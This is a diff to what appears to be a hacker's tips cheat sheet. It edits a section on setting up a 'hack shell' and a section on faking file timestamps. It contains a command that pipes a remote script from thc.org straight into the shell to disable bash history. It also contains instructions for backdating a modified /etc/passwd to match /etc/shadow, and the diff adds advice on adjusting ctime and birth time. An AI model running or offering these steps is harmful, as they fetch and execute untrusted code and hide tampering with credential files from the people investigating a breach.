@@ -118,7 +118,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 <a id="hackshell"></a>
 **1.i. Set up a Hack Shell (bash):**
 
-Make BASH less noisy. Disables *~/.bash_history* and [many other things](/hackerschoice/hackshell).
+Make BASH less noisy. Disables *~/.bash_history* and [many other things](https://github.com/hackerschoice/hackshell).
 ```sh
  source <(curl -SsfL https://thc.org/hs)
 ```
@@ -1792,11 +1792,14 @@ Note: Or delete the file and then fill the entire harddrive with /dev/urandom an
 <a id="restore-timestamp"></a>
 **8.ii. Restore the date of a file**
 
-Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modified. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
+Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modified. Use *touch* to change the file date to the date of another file (in this example, */etc/shadow*)
 
 ```sh
 touch -r /etc/shadow /etc/passwd
+# verify with 'stat /etc/passwd'
 ```
+
+Use [hackshell](#hackshell) and `ctime /etc/passwd` to also adjust the ctime and birth-time.
 
 <a id="shell-clean-logs"></a>
 **8.iii. Clear logfile**
